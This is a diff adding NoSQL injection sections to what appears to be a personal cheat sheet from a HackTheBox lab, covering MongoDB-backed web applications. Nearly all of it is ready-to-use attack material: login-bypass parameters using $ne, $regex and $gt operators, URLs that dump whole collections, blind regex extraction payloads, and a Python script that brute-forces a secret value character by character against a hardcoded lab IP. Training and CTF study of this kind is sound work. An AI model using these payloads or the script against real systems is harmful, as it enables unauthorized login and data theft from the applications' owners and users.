@@ -67,3 +67,81 @@ db.apples.updateMany({}, {$inc: {quantity: 1, "price": 1}}) # increase the price
 db.apples.replaceOne({type:'Pink Lady'}, {name: 'Pink Lady', price: 0.99, color: 'Pink'}) # completely replace the document
 db.apples.remove({price: {$lt: 0.8}}) # remove matched documents
 ```
+
+### Authentication bypass
+
+```php
+email[$ne]=test@test.com&password[$ne]=test // URL encoded parameters passed to PHP equal to password: {$ne: test}
+email[$regex]=.*&email[$regex]=.* // alternative to also return a match on any document
+email=admin%40mangomail.com&password[$ne]=x // when email known and password not known
+email[$gt]=&password[$gt]= // any string is greater than an empty string
+email[$gte]=&password[$gte]= // works same as previous
+```
+
+### In-Band Data Extraction
+
+```bash
+http://<ip>:<port>/?q[$regex]=.* # return whole collection get query
+http://<ip>:<port>/?q[$ne]='doesntExist'
+http://<ip>:<port>/?q[$gt]=''
+http://<ip>:<port>/?q[$gte]=''
+http://<ip>:<port>/?q[$gte]='~'
+http://<ip>:<port>/?q[$lte]='~'
+```
+
+### Blind Data Extraction
+
+```json
+// Using regex to find a value char by char by comparing responses to the POST request
+{
+    "trackingNum":{
+        "$regex":"^3.*"
+    }
+}
+{
+    "trackingNum":{
+        "$regex":"^32.*"
+    }
+}
+{
+    "trackingNum":{
+        "$regex":"^32A.*"
+    }
+}
+```
+
+#### Automating Blind Exploitation
+
+```py
+#!/usr/bin/python3
+
+import requests
+import json
+
+# Oracle
+def oracle(t):
+    r = requests.post(
+        "http://154.57.164.70:32584/index.php",
+        headers = {"Content-Type": "application/json"},
+        data = json.dumps({"trackingNum": t})
+    )
+    return "bmdyy" in r.text # use part of the response to confirm request was valid
+
+# Make sure the oracle is functioning correctly
+assert (oracle("X") == False)
+assert (oracle({"$regex": "^HTB{.*"}) == True)
+
+# Dump the tracking number
+trackingNum = "HTB{" # Tracking number is known to start with 'HTB{'
+for _ in range(32): # Repeat the following 32 times
+    for c in "0123456789abcdef": # Loop through characters [0-9a-f]
+        if oracle({"$regex": "^" + trackingNum + c}): # Check if <trackingNum> + <char> matches with $regex
+            trackingNum += c # If it does, append character to trackingNum ...
+            break # ... and break out of the loop
+trackingNum += "}" # Append known '}' to end of tracking number
+
+# Make sure the tracking number is correct
+assert (oracle(trackingNum) == True)
+
+print("Tracking Number: " + trackingNum)
+```
